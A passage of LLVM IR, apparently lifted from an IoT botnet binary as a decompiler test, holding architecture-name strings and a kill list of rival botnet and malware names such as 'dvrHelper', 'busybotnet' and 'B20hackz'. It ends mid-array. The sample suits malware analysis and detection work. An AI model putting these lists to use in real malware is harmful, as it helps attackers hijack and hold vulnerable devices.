source_filename = "test"
target datalayout = "e-p:32:32:32-f80:32:32"

%sockaddr = type { i32, [14 x i8] }
%_TYPEDEF_sigset_t = type { [1 x i32] }
%timespec = type { i32, i32 }
%sigcontext = type { i32 }
%sigaction = type { void (i32)*, i32, void ()*, %_TYPEDEF_sigset_t }
%pollfd = type { i32, i16, i16 }

@r0 = internal unnamed_addr global i32 0
@r1 = internal unnamed_addr global i32 0
@r2 = internal unnamed_addr global i32 0
@r3 = internal unnamed_addr global i32 0
@r4 = internal unnamed_addr global i32 0
@r5 = internal unnamed_addr global i32 0
@r6 = internal unnamed_addr global i32 0
@r7 = internal unnamed_addr global i32 0
@r8 = internal unnamed_addr global i32 0
@sb = internal unnamed_addr global i32 0
@sl = internal unnamed_addr global i32 0
@fp = internal unnamed_addr global i32 0
@ip = internal unnamed_addr global i32 0
@sp = internal unnamed_addr global i32 0
@lr = internal unnamed_addr global i32 0
@cpsr_z = internal unnamed_addr global i1 false
@0 = external global i32
@global_var_80a0.3 = constant i32 -352321502
@global_var_1d00c.7 = global i32 0
@global_var_1d01c.8 = global i32* @global_var_1d00c.7
@global_var_1d7d4.15 = global i32 0
@global_var_1d010.18 = global i32 0
@global_var_9ee0.22 = constant i32 -509558771
@global_var_12938.29 = constant [5 x i8] c"mips\00"
@global_var_12940.30 = constant [7 x i8] c"mips64\00"
@global_var_12948.31 = constant [7 x i8] c"mipsel\00"
@global_var_12950.32 = constant [6 x i8] c"sh2eb\00"
@global_var_12958.33 = constant [7 x i8] c"sh2elf\00"
@global_var_12960.34 = constant [4 x i8] c"sh4\00"
@global_var_12964.35 = constant [4 x i8] c"x86\00"
@global_var_12968.36 = constant [4 x i8] c"arm\00"
@global_var_1296c.37 = constant [6 x i8] c"armv5\00"
@global_var_12974.38 = constant [8 x i8] c"armv4tl\00"
@global_var_1297c.39 = constant [6 x i8] c"armv4\00"
@global_var_12984.40 = constant [6 x i8] c"armv6\00"
@global_var_1298c.41 = constant [5 x i8] c"i686\00"
@global_var_12994.42 = constant [8 x i8] c"powerpc\00"
@global_var_1299c.43 = constant [13 x i8] c"powerpc440fp\00"
@global_var_129ac.44 = constant [5 x i8] c"i586\00"
@global_var_129b4.45 = constant [5 x i8] c"m68k\00"
@global_var_129bc.46 = constant [6 x i8] c"sparc\00"
@global_var_129c4.47 = constant [7 x i8] c"x86_64\00"
@global_var_129cc.48 = constant [11 x i8] c"jackmymips\00"
@global_var_129d8.49 = constant [13 x i8] c"jackmymips64\00"
@global_var_129e8.50 = constant [13 x i8] c"jackmymipsel\00"
@global_var_129f8.51 = constant [12 x i8] c"jackmysh2eb\00"
@global_var_12a04.52 = constant [13 x i8] c"jackmysh2elf\00"
@global_var_12a14.53 = constant [10 x i8] c"jackmysh4\00"
@global_var_12a20.54 = constant [10 x i8] c"jackmyx86\00"
@global_var_12a2c.55 = constant [12 x i8] c"jackmyarmv5\00"
@global_var_12a38.56 = constant [14 x i8] c"jackmyarmv4tl\00"
@global_var_12a48.57 = constant [12 x i8] c"jackmyarmv4\00"
@global_var_12a54.58 = constant [12 x i8] c"jackmyarmv6\00"
@global_var_12a60.59 = constant [11 x i8] c"jackmyi686\00"
@global_var_12a6c.60 = constant [14 x i8] c"jackmypowerpc\00"
@global_var_12a7c.61 = constant [19 x i8] c"jackmypowerpc440fp\00"
@global_var_12a90.62 = constant [11 x i8] c"jackmyi586\00"
@global_var_12a9c.63 = constant [11 x i8] c"jackmym68k\00"
@global_var_12aa8.64 = constant [12 x i8] c"jackmysparc\00"
@global_var_12ab4.65 = constant [13 x i8] c"jackmyx86_64\00"
@global_var_12ac4.66 = constant [11 x i8] c"hackmymips\00"
@global_var_12ad0.67 = constant [13 x i8] c"hackmymips64\00"
@global_var_12ae0.68 = constant [13 x i8] c"hackmymipsel\00"
@global_var_12af0.69 = constant [12 x i8] c"hackmysh2eb\00"
@global_var_12afc.70 = constant [13 x i8] c"hackmysh2elf\00"
@global_var_12b0c.71 = constant [10 x i8] c"hackmysh4\00"
@global_var_12b18.72 = constant [10 x i8] c"hackmyx86\00"
@global_var_12b24.73 = constant [12 x i8] c"hackmyarmv5\00"
@global_var_12b30.74 = constant [14 x i8] c"hackmyarmv4tl\00"
@global_var_12b40.75 = constant [12 x i8] c"hackmyarmv4\00"
@global_var_12b4c.76 = constant [12 x i8] c"hackmyarmv6\00"
@global_var_12b58.77 = constant [11 x i8] c"hackmyi686\00"
@global_var_12b64.78 = constant [14 x i8] c"hackmypowerpc\00"
@global_var_12b74.79 = constant [19 x i8] c"hackmypowerpc440fp\00"
@global_var_12b88.80 = constant [11 x i8] c"hackmyi586\00"
@global_var_12b94.81 = constant [11 x i8] c"hackmym68k\00"
@global_var_12ba0.82 = constant [12 x i8] c"hackmysparc\00"
@global_var_12bac.83 = constant [13 x i8] c"hackmyx86_64\00"
@global_var_12bbc.84 = constant [3 x i8] c"b1\00"
@global_var_12bc0.85 = constant [3 x i8] c"b2\00"
@global_var_12bc4.86 = constant [3 x i8] c"b3\00"
@global_var_12bc8.87 = constant [3 x i8] c"b4\00"
@global_var_12bcc.88 = constant [3 x i8] c"b5\00"
@global_var_12bd0.89 = constant [3 x i8] c"b6\00"
@global_var_12bd4.90 = constant [3 x i8] c"b7\00"
@global_var_12bd8.91 = constant [3 x i8] c"b8\00"
@global_var_12bdc.92 = constant [3 x i8] c"b9\00"
@global_var_12be0.93 = constant [4 x i8] c"b10\00"
@global_var_12be4.94 = constant [4 x i8] c"b11\00"
@global_var_12be8.95 = constant [4 x i8] c"b12\00"
@global_var_12bec.96 = constant [4 x i8] c"b13\00"
@global_var_12bf0.97 = constant [4 x i8] c"b14\00"
@global_var_12bf4.98 = constant [4 x i8] c"b15\00"
@global_var_12bf8.99 = constant [4 x i8] c"b16\00"
@global_var_12bfc.100 = constant [4 x i8] c"b17\00"
@global_var_12c00.101 = constant [4 x i8] c"b18\00"
@global_var_12c04.102 = constant [4 x i8] c"b19\00"
@global_var_12c08.103 = constant [4 x i8] c"b20\00"
@global_var_12c0c.104 = constant [17 x i8] c"busyboxterrorist\00"
@global_var_12c20.105 = constant [9 x i8] c"DFhxdhdf\00"
@global_var_12c2c.106 = constant [10 x i8] c"dvrHelper\00"
@global_var_12c38.107 = constant [8 x i8] c"FDFDHFC\00"
@global_var_12c40.108 = constant [5 x i8] c"FEUB\00"
@global_var_12c48.109 = constant [9 x i8] c"FTUdftui\00"
@global_var_12c54.110 = constant [9 x i8] c"GHfjfgvj\00"
@global_var_12c60.111 = constant [6 x i8] c"jhUOH\00"
@global_var_12c68.112 = constant [9 x i8] c"JIPJIPJj\00"
@global_var_12c74.113 = constant [10 x i8] c"JIPJuipjh\00"
@global_var_12c80.114 = constant [8 x i8] c"kmymips\00"
@global_var_12c88.115 = constant [10 x i8] c"kmymips64\00"
@global_var_12c94.116 = constant [10 x i8] c"kmymipsel\00"
@global_var_12ca0.117 = constant [9 x i8] c"kmysh2eb\00"
@global_var_12cac.118 = constant [10 x i8] c"kmysh2elf\00"
@global_var_12cb8.119 = constant [7 x i8] c"kmysh4\00"
@global_var_12cc0.120 = constant [7 x i8] c"kmyx86\00"
@global_var_12cc8.121 = constant [9 x i8] c"kmyarmv5\00"
@global_var_12cd4.122 = constant [11 x i8] c"kmyarmv4tl\00"
@global_var_12ce0.123 = constant [9 x i8] c"kmyarmv4\00"
@global_var_12cec.124 = constant [9 x i8] c"kmyarmv6\00"
@global_var_12cf8.125 = constant [8 x i8] c"kmyi686\00"
@global_var_12d00.126 = constant [11 x i8] c"kmypowerpc\00"
@global_var_12d0c.127 = constant [16 x i8] c"kmypowerpc440fp\00"
@global_var_12d1c.128 = constant [8 x i8] c"kmyi586\00"
@global_var_12d24.129 = constant [8 x i8] c"kmym68k\00"
@global_var_12d2c.130 = constant [9 x i8] c"kmysparc\00"
@global_var_12d38.131 = constant [10 x i8] c"kmyx86_64\00"
@global_var_12d44.132 = constant [8 x i8] c"lolmips\00"
@global_var_12d4c.133 = constant [10 x i8] c"lolmips64\00"
@global_var_12d58.134 = constant [10 x i8] c"lolmipsel\00"
@global_var_12d64.135 = constant [9 x i8] c"lolsh2eb\00"
@global_var_12d70.136 = constant [10 x i8] c"lolsh2elf\00"
@global_var_12d7c.137 = constant [7 x i8] c"lolsh4\00"
@global_var_12d84.138 = constant [7 x i8] c"lolx86\00"
@global_var_12d8c.139 = constant [9 x i8] c"lolarmv5\00"
@global_var_12d98.140 = constant [11 x i8] c"lolarmv4tl\00"
@global_var_12da4.141 = constant [9 x i8] c"lolarmv4\00"
@global_var_12db0.142 = constant [9 x i8] c"lolarmv6\00"
@global_var_12dbc.143 = constant [8 x i8] c"loli686\00"
@global_var_12dc4.144 = constant [11 x i8] c"lolpowerpc\00"
@global_var_12dd0.145 = constant [16 x i8] c"lolpowerpc440fp\00"
@global_var_12de0.146 = constant [8 x i8] c"loli586\00"
@global_var_12de8.147 = constant [8 x i8] c"lolm68k\00"
@global_var_12df0.148 = constant [9 x i8] c"lolsparc\00"
@global_var_12dfc.149 = constant [8 x i8] c"RYrydry\00"
@global_var_12e04.150 = constant [8 x i8] c"telmips\00"
@global_var_12e0c.151 = constant [10 x i8] c"telmips64\00"
@global_var_12e18.152 = constant [10 x i8] c"telmipsel\00"
@global_var_12e24.153 = constant [9 x i8] c"telsh2eb\00"
@global_var_12e30.154 = constant [10 x i8] c"telsh2elf\00"
@global_var_12e3c.155 = constant [7 x i8] c"telsh4\00"
@global_var_12e44.156 = constant [7 x i8] c"telx86\00"
@global_var_12e4c.157 = constant [9 x i8] c"telarmv5\00"
@global_var_12e58.158 = constant [11 x i8] c"telarmv4tl\00"
@global_var_12e64.159 = constant [9 x i8] c"telarmv4\00"
@global_var_12e70.160 = constant [9 x i8] c"telarmv6\00"
@global_var_12e7c.161 = constant [8 x i8] c"teli686\00"
@global_var_12e84.162 = constant [11 x i8] c"telpowerpc\00"
@global_var_12e90.163 = constant [16 x i8] c"telpowerpc440fp\00"
@global_var_12ea0.164 = constant [8 x i8] c"teli586\00"
@global_var_12ea8.165 = constant [8 x i8] c"telm68k\00"
@global_var_12eb0.166 = constant [9 x i8] c"telsparc\00"
@global_var_12ebc.167 = constant [10 x i8] c"telx86_64\00"
@global_var_12ec8.168 = constant [12 x i8] c"TwoFacemips\00"
@global_var_12ed4.169 = constant [14 x i8] c"TwoFacemips64\00"
@global_var_12ee4.170 = constant [14 x i8] c"TwoFacemipsel\00"
@global_var_12ef4.171 = constant [13 x i8] c"TwoFacesh2eb\00"
@global_var_12f04.172 = constant [14 x i8] c"TwoFacesh2elf\00"
@global_var_12f14.173 = constant [11 x i8] c"TwoFacesh4\00"
@global_var_12f20.174 = constant [11 x i8] c"TwoFacex86\00"
@global_var_12f2c.175 = constant [13 x i8] c"TwoFacearmv5\00"
@global_var_12f3c.176 = constant [15 x i8] c"TwoFacearmv4tl\00"
@global_var_12f4c.177 = constant [13 x i8] c"TwoFacearmv4\00"
@global_var_12f5c.178 = constant [13 x i8] c"TwoFacearmv6\00"
@global_var_12f6c.179 = constant [12 x i8] c"TwoFacei686\00"
@global_var_12f78.180 = constant [15 x i8] c"TwoFacepowerpc\00"
@global_var_12f88.181 = constant [20 x i8] c"TwoFacepowerpc440fp\00"
@global_var_12f9c.182 = constant [12 x i8] c"TwoFacei586\00"
@global_var_12fa8.183 = constant [12 x i8] c"TwoFacem68k\00"
@global_var_12fb4.184 = constant [13 x i8] c"TwoFacesparc\00"
@global_var_12fc4.185 = constant [14 x i8] c"TwoFacex86_64\00"
@global_var_12fd4.186 = constant [9 x i8] c"UYyuyioy\00"
@global_var_12fe0.187 = constant [9 x i8] c"XDzdfxzf\00"
@global_var_12fec.188 = constant [5 x i8] c"xxb1\00"
@global_var_12ff4.189 = constant [5 x i8] c"xxb2\00"
@global_var_12ffc.190 = constant [5 x i8] c"xxb3\00"
@global_var_13004.191 = constant [5 x i8] c"xxb4\00"
@global_var_1300c.192 = constant [5 x i8] c"xxb5\00"
@global_var_13014.193 = constant [5 x i8] c"xxb6\00"
@global_var_1301c.194 = constant [5 x i8] c"xxb7\00"
@global_var_13024.195 = constant [5 x i8] c"xxb8\00"
@global_var_1302c.196 = constant [5 x i8] c"xxb9\00"
@global_var_13034.197 = constant [6 x i8] c"xxb10\00"
@global_var_1303c.198 = constant [6 x i8] c"xxb11\00"
@global_var_13044.199 = constant [6 x i8] c"xxb12\00"
@global_var_1304c.200 = constant [6 x i8] c"xxb13\00"
@global_var_13054.201 = constant [6 x i8] c"xxb14\00"
@global_var_1305c.202 = constant [6 x i8] c"xxb15\00"
@global_var_13064.203 = constant [6 x i8] c"xxb16\00"
@global_var_1306c.204 = constant [6 x i8] c"xxb17\00"
@global_var_13074.205 = constant [6 x i8] c"xxb18\00"
@global_var_1307c.206 = constant [6 x i8] c"xxb19\00"
@global_var_13084.207 = constant [6 x i8] c"xxb20\00"
@global_var_1308c.208 = constant i32 49
@global_var_13090.209 = constant i32 50
@global_var_13094.210 = constant i32 51
@global_var_13098.211 = constant i32 52
@global_var_1309c.212 = constant i32 53
@global_var_130a0.213 = constant i32 54
@global_var_130a4.214 = constant i32 55
@global_var_130a8.215 = constant i32 56
@global_var_130ac.216 = constant i32 57
@global_var_130b0.217 = constant [3 x i8] c"10\00"
@global_var_130b4.218 = constant [3 x i8] c"11\00"
@global_var_130b8.219 = constant [3 x i8] c"12\00"
@global_var_130bc.220 = constant [3 x i8] c"13\00"
@global_var_130c0.221 = constant [3 x i8] c"14\00"
@global_var_130c4.222 = constant [3 x i8] c"15\00"
@global_var_130c8.223 = constant [3 x i8] c"16\00"
@global_var_130cc.224 = constant [3 x i8] c"17\00"
@global_var_130d0.225 = constant [3 x i8] c"18\00"
@global_var_130d4.226 = constant [3 x i8] c"19\00"
@global_var_130d8.227 = constant [3 x i8] c"20\00"
@global_var_130dc.228 = constant [3 x i8] c"bb\00"
@global_var_130e0.229 = constant [11 x i8] c"busybotnet\00"
@global_var_130ec.230 = constant [5 x i8] c"pppd\00"
@global_var_130f4.231 = constant [6 x i8] c"pppoe\00"
@global_var_130fc.232 = constant [5 x i8] c"wput\00"
@global_var_13104.233 = constant [3 x i8] c"B1\00"
@global_var_13108.234 = constant [3 x i8] c"B2\00"
@global_var_1310c.235 = constant [3 x i8] c"B3\00"
@global_var_13110.236 = constant [3 x i8] c"B4\00"
@global_var_13114.237 = constant [3 x i8] c"B5\00"
@global_var_13118.238 = constant [3 x i8] c"B6\00"
@global_var_1311c.239 = constant [3 x i8] c"B7\00"
@global_var_13120.240 = constant [3 x i8] c"B8\00"
@global_var_13124.241 = constant [3 x i8] c"B9\00"
@global_var_13128.242 = constant [4 x i8] c"B10\00"
@global_var_1312c.243 = constant [4 x i8] c"B11\00"
@global_var_13130.244 = constant [4 x i8] c"B12\00"
@global_var_13134.245 = constant [4 x i8] c"B13\00"
@global_var_13138.246 = constant [4 x i8] c"B14\00"
@global_var_1313c.247 = constant [4 x i8] c"B15\00"
@global_var_13140.248 = constant [4 x i8] c"B16\00"
@global_var_13144.249 = constant [4 x i8] c"B17\00"
@global_var_13148.250 = constant [4 x i8] c"B18\00"
@global_var_1314c.251 = constant [9 x i8] c"B20hackz\00"
@global_var_13158.252 = constant [5 x i8] c"bin*\00"
@global_var_13160.253 = constant [5 x i8] c"gtop\00"
@global_var_13168.254 = constant [5 x i8] c"ftp*\00"
@global_var_13170.255 = constant [6 x i8] c"tftp*\00"
@global_var_13178.256 = constant [7 x i8] c"botnet\00"
@global_var_13180.257 = constant [8 x i8] c"swatnet\00"
@global_var_13188.258 = constant [8 x i8] c"ballpit\00"
@global_var_13190.259 = constant [8 x i8] c"fucknet\00"
@global_var_13198.260 = constant [9 x i8] c"cracknet\00"
@global_var_131a4.261 = constant [8 x i8] c"weednet\00"
@global_var_131ac.262 = constant [7 x i8] c"gaynet\00"
@global_var_131b4.263 = constant [9 x i8] c"queernet\00"
@global_var_131c0.264 = constant [8 x i8] c"ballnet\00"
@global_var_131c8.265 = constant [5 x i8] c"unet\00"
@global_var_131d0.266 = constant [7 x i8] c"yougay\00"
@global_var_131d8.267 = constant [7 x i8] c"sttftp\00"
@global_var_131e0.268 = constant [7 x i8] c"sstftp\00"
@global_var_131e8.269 = constant [7 x i8] c"sbtftp\00"
@global_var_131f0.270 = constant [6 x i8] c"btftp\00"
@global_var_131f8.271 = constant [9 x i8] c"y0u1sg3y\00"
@global_var_13204.272 = constant [6 x i8] c"bruv*\00"
@global_var_1320c.273 = constant [5 x i8] c"IoT*\00"
@global_var_1d024.274 = global [246 x i8*] [i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_12938.29, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_12940.30, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_12948.31, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_12950.32, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_12958.33, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_12960.34, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_12964.35, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_12968.36, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1296c.37, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_12974.38, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1297c.39, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_12984.40, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1298c.41, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_12994.42, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1299c.43, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_129ac.44, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_129b4.45, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_129bc.46, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_129c4.47, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_129cc.48, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_129d8.49, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_129e8.50, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_129f8.51, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_12a04.52, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_12a14.53, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_12a20.54, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_12a2c.55, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_12a38.56, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_12a48.57, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_12a54.58, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_12a60.59, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_12a6c.60, i32 0, i32 0), i8* getelementptr inbounds ([19 x i8], [19 x i8]* @global_var_12a7c.61, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_12a90.62, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_12a9c.63, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_12aa8.64, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_12ab4.65, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_12ac4.66, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_12ad0.67, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_12ae0.68, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_12af0.69, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_12afc.70, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_12b0c.71, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_12b18.72, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_12b24.73, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_12b30.74, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_12b40.75, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_12b4c.76, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_12b58.77, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_12b64.78, i32 0, i32 0), i8* getelementptr inbounds ([19 x i8], [19 x i8]* @global_var_12b74.79, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_12b88.80, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_12b94.81, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_12ba0.82, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_12bac.83, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_12bbc.84, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_12bc0.85, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_12bc4.86, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_12bc8.87, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_12bcc.88, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_12bd0.89, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_12bd4.90, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_12bd8.91, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_12bdc.92, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_12be0.93, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_12be4.94, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_12be8.95, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_12bec.96, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_12bf0.97, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_12bf4.98, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_12bf8.99, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_12bfc.100, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_12c00.101, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_12c04.102, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_12c08.103, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_12c0c.104, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_12c20.105, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_12c2c.106, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_12c38.107, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_12c40.108, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_12c48.109, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_12c54.110, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_12c60.111, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_12c68.112, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_12c74.113, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_12c80.114, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_12c88.115, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_12c94.116, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_12ca0.117, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_12cac.118, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_12cb8.119, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_12cc0.120, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_12cc8.121, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_12cd4.122, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_12ce0.123, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_12cec.124, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_12cf8.125, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_12d00.126, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_12d0c.127, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_12d1c.128, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_12d24.129, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_12d2c.130, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_12d38.131, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_12d44.132, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_12d4c.133, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_12d58.134, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_12d64.135, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_12d70.136, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_12d7c.137, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_12d84.138, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_12d8c.139, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_12d98.140, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_12da4.141, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_12db0.142, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_12dbc.143, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_12dc4.144, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_12dd0.145, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_12de0.146, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_12de8.147, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_12df0.148, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_12dfc.149, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_12e04.150, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_12e0c.151, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_12e18.152, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_12e24.153, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_12e30.154, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_12e3c.155, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_12e44.156, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_12e4c.157, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_12e58.158, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_12e64.159, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_12e70.160, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_12e7c.161, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_12e84.162, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_12e90.163, 